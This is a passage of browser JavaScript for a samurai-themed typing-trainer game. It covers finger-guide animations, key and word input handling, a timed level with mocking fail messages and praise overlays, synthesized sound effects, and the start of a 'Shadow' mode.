        'o': 'r-ring', 'l': 'r-ring',
        'p': 'r-pinky'
    };

    // Key center positions (in SVG viewBox coords)
    // Row 0: y=45, Row 1: y=110, Row 2: y=175
    const keyCenters = {
        'q': { x: 50, y: 45 }, 'w': { x: 115, y: 45 }, 'e': { x: 180, y: 45 },
        'r': { x: 245, y: 45 }, 't': { x: 310, y: 45 }, 'y': { x: 375, y: 45 },
        'u': { x: 440, y: 45 }, 'i': { x: 505, y: 45 }, 'o': { x: 570, y: 45 },
        'p': { x: 635, y: 45 },
        'a': { x: 70, y: 110 }, 's': { x: 135, y: 110 }, 'd': { x: 200, y: 110 },
        'f': { x: 265, y: 110 }, 'g': { x: 330, y: 110 }, 'h': { x: 395, y: 110 },
        'j': { x: 460, y: 110 }, 'k': { x: 525, y: 110 }, 'l': { x: 590, y: 110 },
        'z': { x: 102, y: 175 }, 'x': { x: 167, y: 175 }, 'c': { x: 232, y: 175 },
        'v': { x: 297, y: 175 }, 'b': { x: 362, y: 175 }, 'n': { x: 427, y: 175 },
        'm': { x: 492, y: 175 }
    };

    // Finger home positions (center of home row key)
    const fingerHomes = {
        'l-pinky': { x: 70, y: 110 },
        'l-ring': { x: 135, y: 110 },
        'l-mid': { x: 200, y: 110 },
        'l-index': { x: 265, y: 110 },
        'r-index': { x: 460, y: 110 },
        'r-mid': { x: 525, y: 110 },
        'r-ring': { x: 590, y: 110 },
        'r-pinky': { x: 648, y: 110 }
    };

    function highlightGuideFinger(key) {
        if (!dojoState.handGuideOn) return;

        // Reset ALL fingers to home position and remove active class
        document.querySelectorAll('.guide-finger-position').forEach(g => {
            g.style.transform = '';
            g.querySelector('.guide-finger')?.classList.remove('finger-active');
        });

        if (!key) return;
        const info = keyFingerMap[key.toLowerCase()];
        const fingerName = typeof info === 'string' ? info : (info ? info.finger : null);
        if (!fingerName) return;

        // Highlight the legend panel
        updateFingerLegend(fingerName);

        const k = key.toLowerCase();
        const target = keyCenters[k];
        const home = fingerHomes[fingerName];
        if (!target || !home) return;

        const group = document.querySelector(`.guide-finger-position[data-finger="${fingerName}"]`);
        if (!group) return;

        // Calculate delta from home to target key
        const dx = target.x - home.x;
        const dy = target.y - home.y;

        // Create ghost trail if moving significantly
        const currentDx = parseFloat(group.style.getPropertyValue('--finger-dx') || 0);
        const currentDy = parseFloat(group.style.getPropertyValue('--finger-dy') || 0);
        const dist = Math.hypot(dx - currentDx, dy - currentDy);

        if (dist > 10) {
            const ghost = group.cloneNode(true);
            ghost.classList.add('guide-ghost');
            // Ensure ghost stays at old position
            ghost.style.transform = `translate(${currentDx}px, ${currentDy}px)`;
            // Remove ID if any to avoid duplicates
            ghost.removeAttribute('id');
            // Insert before the active group so it appears behind
            group.parentNode.insertBefore(ghost, group);

            // Remove after animation
            setTimeout(() => ghost.remove(), 300);
        }

        // Move the finger position group
        // We set vars on the *position* group, but they are inherited if needed
        group.style.setProperty('--finger-dx', `${dx}px`);
        group.style.setProperty('--finger-dy', `${dy}px`);
        group.style.transform = `translate(${dx}px, ${dy}px)`;
        group.querySelector('.guide-finger')?.classList.add('finger-active');
    }

    function animateFingerPress(key) {
        if (!dojoState.handGuideOn || !key) return;
        const k = key.toLowerCase();
        const info = keyFingerMap[k];
        const fingerName = typeof info === 'string' ? info : (info ? info.finger : null);
        if (!fingerName) return;

        const posGroup = document.querySelector(`.guide-finger-position[data-finger="${fingerName}"]`);
        if (posGroup) {
            const squishGroup = posGroup.querySelector('.guide-finger-squish');
            if (squishGroup) {
                squishGroup.classList.remove('guide-finger-pressing');
                void squishGroup.offsetWidth; // Force reflow
                squishGroup.classList.add('guide-finger-pressing');

                // Create Ripple at fingertip
                const marker = squishGroup.querySelector('.guide-tip-marker');
                if (marker) {
                    const cx = parseFloat(marker.getAttribute('cx'));
                    const cy = parseFloat(marker.getAttribute('cy'));
                    const dx = parseFloat(posGroup.style.getPropertyValue('--finger-dx') || 0);
                    const dy = parseFloat(posGroup.style.getPropertyValue('--finger-dy') || 0);

                    const ripple = document.createElementNS("http://www.w3.org/2000/svg", "circle");
                    ripple.setAttribute("cx", cx + dx);
                    ripple.setAttribute("cy", cy + dy);
                    ripple.setAttribute("r", "5");
                    ripple.setAttribute("class", "guide-ripple");

                    // Match ripple color to finger color? 
                    // Let's just use the white/default for now as it looks clean on dark bg

                    const svg = document.querySelector('.hand-guide-svg');
                    if (svg) {
                        svg.appendChild(ripple);
                        setTimeout(() => ripple.remove(), 400);
                    }
                }
            }
        }
    }

    function flashCorrectFinger() {
        if (!dojoState.handGuideOn) return;
        // Find the currently active finger (the one the user SHOULD use)
        const activeFinger = document.querySelector('.guide-finger.finger-active');
        if (activeFinger) {
            activeFinger.classList.add('finger-wrong');
            setTimeout(() => activeFinger.classList.remove('finger-wrong'), 300);
        }
    }

    function toggleHandGuide() {
        dojoState.handGuideOn = !dojoState.handGuideOn;
        const overlay = document.getElementById('hand-guide-overlay');
        const btn = document.getElementById('dojo-guide-btn');
        const legend = document.getElementById('finger-legend-scroll');
        if (overlay) overlay.style.display = dojoState.handGuideOn ? '' : 'none';
        if (btn) btn.classList.toggle('active', dojoState.handGuideOn);

        if (legend) {
            if (dojoState.handGuideOn) {
                // Show first, then play open animation
                legend.style.display = '';
                legend.classList.remove('scroll-closing');
                // Force reflow so animation restarts
                void legend.offsetWidth;
                legend.classList.add('scroll-opening');
            } else {
                // Play close animation, then hide
                legend.classList.remove('scroll-opening');
                legend.classList.add('scroll-closing');
                legend.addEventListener('animationend', () => {
                    if (legend.classList.contains('scroll-closing')) {
                        legend.style.display = 'none';
                        legend.classList.remove('scroll-closing');
                    }
                }, { once: true });
            }
        }

        if (dojoState.handGuideOn) {
            // Move the correct finger to the currently active key
            const activeKey = document.querySelector('#dojo-keyboard .key-active');
            if (activeKey) highlightGuideFinger(activeKey.dataset.key);
        } else {
            // Reset all fingers to home
            document.querySelectorAll('.guide-finger-group').forEach(g => {
                g.style.transform = '';
                g.querySelector('.guide-finger')?.classList.remove('finger-active');
            });
            // Clear legend highlights
            document.querySelectorAll('.finger-legend-item').forEach(i => i.classList.remove('legend-active'));
        }
    }

    // Update the legend panel to highlight the active finger
    function updateFingerLegend(fingerName) {
        if (!dojoState.handGuideOn) return;
        const items = document.querySelectorAll('.finger-legend-item');
        items.forEach(item => {
            const legFinger = item.dataset.legendFinger;
            const isActive = fingerName && fingerName.includes(legFinger);
            item.classList.toggle('legend-active', isActive);
        });
    }

    function initDojoLevel1() {
        // Reset state
        dojoState.active = true;
        dojoState.streak = 0;
        dojoState.maxStreak = 0;
        dojoState.total = 0;
        dojoState.correct = 0;
        dojoState.wordCharIndex = 0;

        updateDojoStats();
        nextDojoPrompt();

        // Start global 30-min countdown for Level 7
        if (dojoState.timedMode && dojoState.globalTimeLeft > 0) {
            if (dojoState.globalTimerInterval) clearInterval(dojoState.globalTimerInterval);

            dojoState.globalTimerInterval = setInterval(() => {
                if (!dojoState.active) return;

                dojoState.globalTimeLeft--;
                const mins = Math.floor(dojoState.globalTimeLeft / 60);
                const secs = dojoState.globalTimeLeft % 60;
                const timerEl = document.getElementById('dojo-global-timer-value');
                if (timerEl) {
                    timerEl.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
                    if (dojoState.globalTimeLeft <= 60) {
                        timerEl.classList.add('danger');
                    }
                }

                if (dojoState.globalTimeLeft <= 0) {
                    clearInterval(dojoState.globalTimerInterval);
                    dojoState.globalTimerInterval = null;
                    dojoLevel7Victory();
                }
            }, 1000);
        }

        // Remove old listener if any
        if (dojoState.listener) {
            document.removeEventListener('keydown', dojoState.listener);
        }

        dojoState.listener = (e) => {
            if (!dojoState.active) return;
            if (state.gameMode !== 'dojo') return;

            const pressed = e.key.toLowerCase();
            if (pressed.length !== 1 || pressed < 'a' || pressed > 'z') return;

            e.preventDefault();

            if (dojoState.wordMode) {
                // === WORD MODE ===
                handleDojoWordInput(pressed);
            } else {
                // === KEY MODE ===
                handleDojoKeyInput(pressed);
            }

            updateDojoStats();
        };

        document.addEventListener('keydown', dojoState.listener);
    }

    function handleDojoKeyInput(pressed) {
        dojoState.total++;

        if (pressed === dojoState.target) {
            dojoState.correct++;
            dojoState.streak++;
            if (dojoState.streak > dojoState.maxStreak) dojoState.maxStreak = dojoState.streak;

            const keyEl = document.querySelector(`#dojo-keyboard .dojo-key[data-key="${pressed}"]`);
            if (keyEl) {
                keyEl.classList.remove('key-active');
                keyEl.classList.add('key-correct');
                setTimeout(() => keyEl.classList.remove('key-correct'), 300);
            }

            showDojoSliceEffect();
            playDojoSliceSound();
            animateFingerPress(pressed);

            setTimeout(() => {
                if (dojoState.active) nextDojoPrompt();
            }, 300);
        } else {
            dojoState.streak = 0;
            flashCorrectFinger();

            const keyEl = document.querySelector(`#dojo-keyboard .dojo-key[data-key="${pressed}"]`);
            if (keyEl) {
                keyEl.classList.add('key-wrong');
                setTimeout(() => keyEl.classList.remove('key-wrong'), 400);
            }

            showDojoClashEffect();
            playDojoClashSound();

            const container = document.getElementById('dojo-keyboard-container');
            if (container) {
                container.classList.add('shake');
                setTimeout(() => container.classList.remove('shake'), 300);
            }
        }
    }

    function handleDojoWordInput(pressed) {
        const word = dojoState.currentWord;
        if (!word) return;

        const expected = word[dojoState.wordCharIndex];
        const charSpans = document.querySelectorAll('#dojo-word-chars .dojo-word-char');
        dojoState.total++;

        // Highlight pressed key on keyboard
        const keyEl = document.querySelector(`#dojo-keyboard .dojo-key[data-key="${pressed}"]`);

        if (pressed === expected) {
            // Correct character
            dojoState.correct++;
            dojoState.streak++;
            if (dojoState.streak > dojoState.maxStreak) dojoState.maxStreak = dojoState.streak;

            // Mark char as typed
            if (charSpans[dojoState.wordCharIndex]) {
                charSpans[dojoState.wordCharIndex].classList.remove('active');
                charSpans[dojoState.wordCharIndex].classList.add('typed');
            }

            // Flash key green
            if (keyEl) {
                keyEl.classList.add('key-correct');
                setTimeout(() => keyEl.classList.remove('key-correct'), 300);
            }

            dojoState.wordCharIndex++;

            // Check if word is complete
            if (dojoState.wordCharIndex >= word.length) {
                // Clear timer if timed mode
                if (dojoState.timerInterval) {
                    clearInterval(dojoState.timerInterval);
                    dojoState.timerInterval = null;
                }

                // Word done — slice effect!
                showDojoSliceEffect();
                playDojoSliceSound();
                animateFingerPress(pressed); // Animate last char press

                setTimeout(() => {
                    if (dojoState.active) nextDojoPrompt();
                }, 400);
            } else {
                // Highlight next char
                if (charSpans[dojoState.wordCharIndex]) {
                    charSpans[dojoState.wordCharIndex].classList.add('active');
                }

                // Animate press for current char (before moving to next)
                animateFingerPress(pressed);

                // Highlight next key on keyboard
                const nextKey = word[dojoState.wordCharIndex];
                document.querySelectorAll('#dojo-keyboard .key-active').forEach(el => el.classList.remove('key-active'));
                const nextKeyEl = document.querySelector(`#dojo-keyboard .dojo-key[data-key="${nextKey}"]`);
                if (nextKeyEl) nextKeyEl.classList.add('key-active');
                highlightGuideFinger(nextKey);
            }
        } else {
            // Wrong character
            dojoState.streak = 0;
            flashCorrectFinger();

            // Level 7: instant kick on mistake
            if (dojoState.timedMode) {
                if (dojoState.timerInterval) {
                    clearInterval(dojoState.timerInterval);
                    dojoState.timerInterval = null;
                }
                dojoLevel7Fail();
                return;
            }

            // Flash current char red
            if (charSpans[dojoState.wordCharIndex]) {
                charSpans[dojoState.wordCharIndex].classList.add('wrong');
                setTimeout(() => {
                    if (charSpans[dojoState.wordCharIndex]) {
                        charSpans[dojoState.wordCharIndex].classList.remove('wrong');
                    }
                }, 400);
            }

            // Flash wrong key red
            if (keyEl) {
                keyEl.classList.add('key-wrong');
                setTimeout(() => keyEl.classList.remove('key-wrong'), 400);
            }

            showDojoClashEffect();
            playDojoClashSound();

            const container = document.getElementById('dojo-keyboard-container');
            if (container) {
                container.classList.add('shake');
                setTimeout(() => container.classList.remove('shake'), 300);
            }
        }
    }

    async function dojoLevel7Victory() {
        // Stop everything
        dojoState.active = false;
        if (dojoState.listener) {
            document.removeEventListener('keydown', dojoState.listener);
            dojoState.listener = null;
        }
        if (dojoState.timerInterval) {
            clearInterval(dojoState.timerInterval);
            dojoState.timerInterval = null;
        }
        if (dojoState.globalTimerInterval) {
            clearInterval(dojoState.globalTimerInterval);
            dojoState.globalTimerInterval = null;
        }

        // Increment win count in localStorage immediately
        let wins = parseInt(localStorage.getItem('dojo_level7_wins') || '0', 10);
        wins++;
        localStorage.setItem('dojo_level7_wins', wins.toString());

        // Play slice sound for victory
        playDojoSliceSound();
        showDojoSliceEffect();

        // Random praise text
        const praises = [
            { main: 'TRUE WARRIOR.', sub: 'THE WIND BOWS TO YOUR SPEED' },
            { main: 'MASTERY ACHIEVED.', sub: 'THE BLADE AND YOU ARE ONE' },
            { main: 'LEGENDARY.', sub: 'YOUR NAME ECHOES THROUGH THE DOJO' },
            { main: 'PERFECTION.', sub: 'EVEN THE MASTERS APPLAUD' },
            { main: 'UNSTOPPABLE.', sub: 'NO WORD CAN OUTRUN YOU' },
            { main: 'HONORED SAMURAI.', sub: 'YOU HAVE EARNED YOUR PLACE' },
            { main: 'THE WIND OBEYS.', sub: 'YOUR FINGERS MOVE LIKE LIGHTNING' },
            { main: 'FLAWLESS VICTORY.', sub: 'FIFTEEN SECONDS OF PURE DISCIPLINE' },
            { main: 'ABSOLUTE FOCUS.', sub: 'THE PATH OF THE WARRIOR IS YOURS' },
            { main: 'TRANSCENDENT.', sub: 'YOU HAVE SURPASSED ALL LIMITS' },
            { main: 'A LIVING BLADE.', sub: 'SPEED AND PRECISION IN HARMONY' },
            { main: 'SENSEI MATERIAL.', sub: 'SOON YOU WILL TEACH THE DOJO' },
            { main: 'IMMORTAL HANDS.', sub: 'THEY WILL WRITE SONGS ABOUT THIS' },
            { main: 'MASTER OF THE WIND.', sub: 'THE STORM ITSELF YIELDS TO YOU' },
            { main: 'BEYOND MORTAL.', sub: 'YOUR DISCIPLINE IS UNMATCHED' },
            { main: 'SACRED SPEED.', sub: 'THE ANCESTORS SMILE UPON YOU' },
            { main: 'UNTOUCHABLE.', sub: 'NO ERROR COULD FIND YOU' },
            { main: 'CHAMPION.', sub: 'THE DOJO BOWS IN YOUR PRESENCE' },
            { main: 'IRON WILL.', sub: 'FIFTEEN SECONDS WITHOUT FALTERING' },
            { main: 'ENLIGHTENED.', sub: 'THE WAY OF THE WIND IS YOURS FOREVER' }
        ];

        const praise = praises[Math.floor(Math.random() * praises.length)];

        // Create victory overlay
        const overlay = document.createElement('div');
        overlay.className = 'dojo-victory-overlay';
        overlay.innerHTML = `
            <div class="dojo-victory-kanji">勝</div>
            <div class="dojo-victory-text">${praise.main}</div>
            <div class="dojo-victory-sub">${praise.sub}</div>
            <div class="dojo-victory-wins">WIND CONQUESTS: ${wins}</div>
        `;
        document.body.appendChild(overlay);

        // Record in Supabase (Global Leaderboard) in BACKGROUND
        if (window.recordDojoWin) {
            window.recordDojoWin().then(dbWins => {
                if (dbWins !== null) {
                    // Sync local storage to match DB
                    localStorage.setItem('dojo_level7_wins', dbWins.toString());
                    // Update overlay if still visible? 
                    // No need to be distracting, just store it for next time.
                }
            });
        }

        // Fade out and return to dojo setup
        setTimeout(() => {
            overlay.classList.add('fade-out');
            setTimeout(() => {
                overlay.remove();
                initDojoSetup();
            }, 500);
        }, 3500);
    }

    function dojoLevel7Fail() {
        // Stop the game
        dojoState.active = false;
        if (dojoState.listener) {
            document.removeEventListener('keydown', dojoState.listener);
            dojoState.listener = null;
        }
        if (dojoState.globalTimerInterval) {
            clearInterval(dojoState.globalTimerInterval);
            dojoState.globalTimerInterval = null;
        }

        playDojoClashSound();
        showDojoClashEffect();

        // Random roast text
        const roasts = [
            { main: 'WHO LET YOU IN HERE?', sub: 'BACK TO THE BASICS, NOVICE' },
            { main: 'GET OUT.', sub: 'YOU ARE NOT READY' },
            { main: 'YOU DON\'T BELONG HERE', sub: 'RETURN WHEN YOU ARE WORTHY' },
            { main: 'PATHETIC.', sub: 'A TRUE WARRIOR DOES NOT FALTER' },
            { main: 'DISGRACEFUL', sub: 'THE BLADE WEEPS FOR YOU' },
            { main: 'TOO SLOW.', sub: 'THE WIND DOES NOT WAIT' },
            { main: 'UNWORTHY', sub: 'MASTER THE BASICS FIRST' },
            { main: 'LAUGHABLE.', sub: 'EVEN THE WOODEN SWORD MOCKS YOU' },
            { main: 'SHAMEFUL DISPLAY', sub: 'YOUR SENSEI WOULD BE DISAPPOINTED' },
            { main: 'FAILURE.', sub: 'BEGIN AGAIN FROM NOTHING' },
            { main: 'ABSOLUTE AMATEUR.', sub: 'YOUR ANCESTORS ARE WEEPING' },
            { main: 'BEGONE.', sub: 'THE DOJO IS FOR THE DISCIPLINED' },
            { main: 'A SWORDSMAN?', sub: 'YOU ARE BARELY A PEASANT' },
            { main: 'STICK TO TEA.', sub: 'THE KATANA IS FOR WARRIORS' },
            { main: 'PITIFUL STANCE.', sub: 'YOU TRIP OVER YOUR OWN SHADOW' },
            { main: 'LOST IN THE FOG.', sub: 'SEARCH FOR YOUR SOUL AT LEVEL 1' },
            { main: 'THE VOID CALLS.', sub: 'AND YOU HAVE NO ANSWER' },
            { main: 'BROKEN SPIRIT.', sub: 'REFORGE YOURSELF FROM THE BOTTOM' },
            { main: 'CLUMSY.', sub: 'THE MOUNTAIN DOES NOT SHAKE, BUT YOU DO' },
            { main: 'DULL BLADE.', sub: 'YOU CANNOT EVEN CUT THE AIR' },
            { main: 'YOU THINK YOU BELONG HERE?', sub: 'NOT WITH THAT REFLEX' },
            { main: 'DREAMING OF MASTERY?', sub: 'WAKE UP IN LEVEL 1' },
            { main: 'A FOOL\'S ERRAND.', sub: 'DO NOT WASTE THE MASTER\'S TIME' },
            { main: 'IS THAT ALL?', sub: 'MY GRANDMOTHER TYPES FASTER WITH ONE CHOPSTICK' },
            { main: 'SIMPLY UNBALANCED.', sub: 'FIND YOUR CENTER AT THE START' },
            { main: 'GO BACK TO SCHOOL.', sub: 'YOU HAVE MUCH TO LEARN, CHILD' },
            { main: 'GET OUT OF MY SIGHT.', sub: 'YOU ARE AN EMBARRASSMENT' },
            { main: 'IS THIS A JOKE?', sub: 'MY CAT TYPES BEYOND YOUR SKILL' },
            { main: 'STICK TO COLORING BOOKS.', sub: 'THE WAY OF THE BLADE IS NOT FOR YOU' },
            { main: 'MOCKERY OF A WARRIOR.', sub: 'YOUR HANDS ARE MADE OF BUTTER' },
            { main: 'GO HOME.', sub: 'YOU ARE NOT WELCOME IN THIS DOJO' }
        ];

        const roast = roasts[Math.floor(Math.random() * roasts.length)];

        // Create overlay
        const overlay = document.createElement('div');
        overlay.className = 'dojo-fail-overlay';
        overlay.innerHTML = `
            <div class="dojo-fail-text">${roast.main}</div>
            <div class="dojo-fail-sub">${roast.sub}</div>
        `;
        document.body.appendChild(overlay);

        // Fade out and kick to Level 1
        setTimeout(() => {
            overlay.classList.add('fade-out');
            setTimeout(() => {
                overlay.remove();
                launchDojoLevel(1);
            }, 500);
        }, 2000);
    }

    function nextDojoPrompt() {
        // Clear old active states
        document.querySelectorAll('#dojo-keyboard .key-active').forEach(el => el.classList.remove('key-active'));

        if (dojoState.wordMode) {
            // === WORD MODE ===
            const pool = dojoState.wordPool;
            dojoState.currentWord = pool[Math.floor(Math.random() * pool.length)];
            dojoState.wordCharIndex = 0;

            // Render word as character spans
            const charsContainer = document.getElementById('dojo-word-chars');
            if (charsContainer) {
                charsContainer.innerHTML = dojoState.currentWord.split('').map((ch, i) =>
                    `<span class="dojo-word-char ${i === 0 ? 'active' : ''}">${ch.toUpperCase()}</span>`
                ).join('');
            }

            // Highlight first key on keyboard
            const firstKey = dojoState.currentWord[0];
            const keyEl = document.querySelector(`#dojo-keyboard .dojo-key[data-key="${firstKey}"]`);
            if (keyEl) keyEl.classList.add('key-active');
            highlightGuideFinger(firstKey);

            // Update word label based on timed mode
            const wordLabel = document.querySelector('.dojo-word-label');
            if (wordLabel) {
                wordLabel.textContent = dojoState.timedMode ? 'TYPE BEFORE TIME RUNS OUT' : 'TYPE THE WORD';
            }

            // Start timer for Level 7
            if (dojoState.timerInterval) {
                clearInterval(dojoState.timerInterval);
                dojoState.timerInterval = null;
            }
            if (dojoState.timedMode) {
                const timerFill = document.getElementById('dojo-timer-fill');
                const timeLimit = Math.max(1200, dojoState.currentWord.length * 250); // 250ms per char, min 1.2s
                const startTime = Date.now();

                if (timerFill) {
                    timerFill.style.width = '100%';
                    timerFill.classList.remove('danger');
                }

                dojoState.timerInterval = setInterval(() => {
                    const elapsed = Date.now() - startTime;
                    const remaining = Math.max(0, 1 - elapsed / timeLimit);

                    if (timerFill) {
                        timerFill.style.width = `${remaining * 100}%`;
                        if (remaining < 0.3) {
                            timerFill.classList.add('danger');
                        }
                    }

                    if (remaining <= 0) {
                        // Time's up!
                        clearInterval(dojoState.timerInterval);
                        dojoState.timerInterval = null;
                        dojoState.streak = 0;

                        dojoLevel7Fail();
                    }
                }, 50);
            }

        } else {
            // === KEY MODE ===
            const pool = dojoState.keyPool && dojoState.keyPool.length > 0
                ? dojoState.keyPool
                : ['f', 'j'];
            dojoState.target = pool[Math.floor(Math.random() * pool.length)];

            const promptEl = document.getElementById('dojo-prompt');
            if (promptEl) promptEl.textContent = dojoState.target.toUpperCase();

            const leftKeys = 'qwertasdfgzxcvb';
            const stanceEl = document.getElementById('dojo-stance');
            if (stanceEl) {
                stanceEl.textContent = leftKeys.includes(dojoState.target)
                    ? 'HOME STANCE \u2014 LEFT HAND'
                    : 'HOME STANCE \u2014 RIGHT HAND';
            }

            const keyEl = document.querySelector(`#dojo-keyboard .dojo-key[data-key="${dojoState.target}"]`);
            if (keyEl) keyEl.classList.add('key-active');
            highlightGuideFinger(dojoState.target);
        }
    }

    function updateDojoStats() {
        const streakEl = document.getElementById('dojo-streak');
        const accEl = document.getElementById('dojo-accuracy');
        const totalEl = document.getElementById('dojo-total');

        if (streakEl) streakEl.textContent = dojoState.streak;
        if (totalEl) totalEl.textContent = dojoState.total;
        if (accEl) {
            const acc = dojoState.total > 0
                ? Math.round((dojoState.correct / dojoState.total) * 100)
                : 100;
            accEl.textContent = acc + '%';
        }

        const overlay = document.getElementById('hand-guide-overlay');
        if (overlay) {
            overlay.classList.remove('glow-low', 'glow-med', 'glow-high');
            if (dojoState.streak > 50) overlay.classList.add('glow-high');
            else if (dojoState.streak > 25) overlay.classList.add('glow-med');
            else if (dojoState.streak > 10) overlay.classList.add('glow-low');
        }
    }

    function showDojoSliceEffect() {
        const el = document.createElement('div');
        el.className = 'dojo-slice-effect';
        document.body.appendChild(el);
        setTimeout(() => el.remove(), 500);
    }

    function showDojoClashEffect() {
        // Radial clash
        const clash = document.createElement('div');
        clash.className = 'dojo-clash-effect';
        document.body.appendChild(clash);
        setTimeout(() => clash.remove(), 500);

        // Vignette flash
        const vig = document.createElement('div');
        vig.className = 'dojo-vignette-flash';
        document.body.appendChild(vig);
        setTimeout(() => vig.remove(), 400);
    }

    function playDojoSliceSound() {
        if (!audioCtx || !soundEnabled) return;
        const t = audioCtx.currentTime;
        const vol = (userConfig.soundVolume || 70) / 100;

        // Metallic shing — high freq sweep down
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(4000, t);
        osc.frequency.exponentialRampToValueAtTime(1200, t + 0.08);
        gain.gain.setValueAtTime(0.12 * vol, t);
        gain.gain.exponentialRampToValueAtTime(0.001, t + 0.12);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(t);
        osc.stop(t + 0.15);

        // Air whoosh
        if (noiseBuffer) {
            createNoiseBurst(t, 0.06, 0.06 * vol, 3000, 1.5, 'highpass');
        }
    }

    function playDojoClashSound() {
        if (!audioCtx || !soundEnabled) return;
        const t = audioCtx.currentTime;
        const vol = (userConfig.soundVolume || 70) / 100;

        // Low rumble
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'square';
        osc.frequency.setValueAtTime(200, t);
        osc.frequency.exponentialRampToValueAtTime(80, t + 0.1);
        gain.gain.setValueAtTime(0.1 * vol, t);
        gain.gain.exponentialRampToValueAtTime(0.001, t + 0.15);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(t);
        osc.stop(t + 0.2);

        // Harsh impact noise
        if (noiseBuffer) {
            createNoiseBurst(t, 0.05, 0.12 * vol, 1500, 1, 'bandpass');
        }
    }

    // --- VICTORY PARTICLES ---
    let victoryAnimId = null;

    function runVictoryParticles(color, type = 'falling') {
        const canvas = document.createElement('canvas');
        canvas.id = 'victory-particles';
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.width = '100%';
        canvas.style.height = '100%';
        canvas.style.pointerEvents = 'none';
        canvas.style.zIndex = '8000'; // Behind text (9999) but above BG
        document.body.appendChild(canvas);

        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const particles = [];
        const particleCount = 150;

        for (let i = 0; i < particleCount; i++) {
            particles.push(createVictoryParticle(canvas, color, type));
        }

        function frame() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            particles.forEach((p, i) => {
                // Update Position
                if (type === 'rising') {
                    p.y -= p.speedY;
                    p.x += Math.sin(p.wobble) * 0.5;
                } else { // falling
                    p.y += p.speedY;
                    p.x += Math.sin(p.wobble) * 1;
                }
                p.wobble += p.wobbleSpeed;

                // Reset if out of bounds
                if (type === 'rising' && p.y < -10) {
                    particles[i] = createVictoryParticle(canvas, color, type, true);
                } else if (type === 'falling' && p.y > canvas.height + 10) {
                    particles[i] = createVictoryParticle(canvas, color, type, true);
                }

                // Draw
                ctx.globalAlpha = p.opacity;
                ctx.fillStyle = p.color;
                ctx.beginPath();
                if (type === 'falling') {
                    // Petal shape (oval-ish)
                    ctx.ellipse(p.x, p.y, p.size, p.size * 1.5, p.tilt, 0, Math.PI * 2);
                } else {
                    // Spark/Ember (Circle)
                    ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                }
                ctx.fill();
            });

            victoryAnimId = requestAnimationFrame(frame);
        }
        frame();
    }

    function createVictoryParticle(canvas, color, type, reset = false) {
        const x = Math.random() * canvas.width;
        const y = reset ? (type === 'rising' ? canvas.height + 10 : -10) : Math.random() * canvas.height;
        return {
            x: x,
            y: y,
            size: Math.random() * 3 + 1,
            speedY: Math.random() * 1.5 + 0.5,
            color: color,
            opacity: Math.random() * 0.6 + 0.4,
            wobble: Math.random() * Math.PI * 2,
            wobbleSpeed: Math.random() * 0.05,
            tilt: Math.random() * Math.PI // For petals
        };
    }

    function startShadowMode() {
        const shadowSplash = document.getElementById('shadow-splash');
        if (shadowSplash) {
            shadowSplash.classList.remove('hidden');

            // Hide Main UI Elements
            const elementsToHide = [
                'landing-page', 'game-ui', 'test-config',
                'words-container', 'results-screen', 'modes-modal'
            ];

            elementsToHide.forEach(id => {
                const el = document.getElementById(id);
                if (el) el.classList.add('hidden');
            });

            // Save current audio state then pause everything
            wasPlayingBeforeShadow.masterPlaying = !masterAudio.paused;
            wasPlayingBeforeShadow.bgAudioPlaying = currentBgAudio && !currentBgAudio.paused;
            wasPlayingBeforeShadow.bgVideoMuted = UI.bgVideo ? UI.bgVideo.muted : true;
            if (!masterAudio.paused) masterAudio.pause();
            if (currentBgAudio && !currentBgAudio.paused) currentBgAudio.pause();
            // Mute wallpaper video audio (e.g. Gura Yuri has built-in audio)
            if (UI.bgVideo) UI.bgVideo.muted = true;

            // Start Shadow music immediately
            playShadowTrack(currentShadowTrack);

            // Transition to Shadow Setup after ritual
            setTimeout(() => {
                shadowSplash.classList.add('hidden');

                const shadowUI = document.getElementById('shadow-ui');
                if (shadowUI) {
                    shadowUI.classList.remove('hidden');
                    initShadowTrackSelector();
                    initShadowSetup(); // Initialize listeners
                }
            }, 3000);
        }
    }
    window.startShadowMode = startShadowMode; // Expose for testing

    function initShadowSetup() {
        // Exit Button
        const exitBtn = document.getElementById('s-exit-btn');
        if (exitBtn) {
            exitBtn.addEventListener('click', () => {
                exitShadowMode();
            });
        }

        // Difficulty Buttons
        const opts = document.querySelectorAll('.s-opt-btn');
        opts.forEach(btn => {
            btn.addEventListener('click', () => {
                const label = btn.innerText;
                let msPerWord = 2000; // Ghost (2s per word)

                if (label === 'WRAITH') msPerWord = 1400; // 1.4s
                if (label === 'VOID') msPerWord = 900; // 0.9s - Very Fast

                // Fallback / Specific overrides from previous logic
                if (btn.id === 's-wraith-btn') msPerWord = 1400;
                if (btn.id === 's-void-btn') msPerWord = 60000 / 70; // ~857ms

                state.shadowBloomDuration = msPerWord;
                initShadowGame();
            });
        });

        // Shadow Result Buttons (Result Overlay)
        const retryBtn = document.getElementById('s-retry-btn');
        if (retryBtn) {
            // Remove old listeners to be safe (clone node tactic or just simple add)
            // Since this runs once on init, simple add is fine.
            retryBtn.onclick = () => initShadowGame();
        }

        const leaveBtn = document.getElementById('s-leave-btn');
        if (leaveBtn) {
            leaveBtn.onclick = () => exitShadowMode();
        }
    }

    function initShadowGame() {
        // STRICT CLEANUP
        if (torchIntervalID) {
            clearInterval(torchIntervalID);
            torchIntervalID = null;
        }
        document.getElementById('s-result-overlay').classList.add('hidden');

        document.getElementById('s-setup').classList.add('hidden');
        const board = document.getElementById('s-game-board');
        board.classList.remove('hidden');

        state.isActive = true;
        state.gameMode = 'shadow';
        state.words = [];
        state.currWordIndex = 0;
        state.currCharIndex = 0;
        state.correctChars = 0;
        state.correctChars = 0;
        state.startTime = null;
        state.shadowStreak = 0; // Sanity Meter
        startShadowStatsUpdater();

        // Torch State
        state.torchWordIndex = 0; // Starts at 0

        // Generate Words (Challenging Mix)
        for (let i = 0; i < 30; i++) {
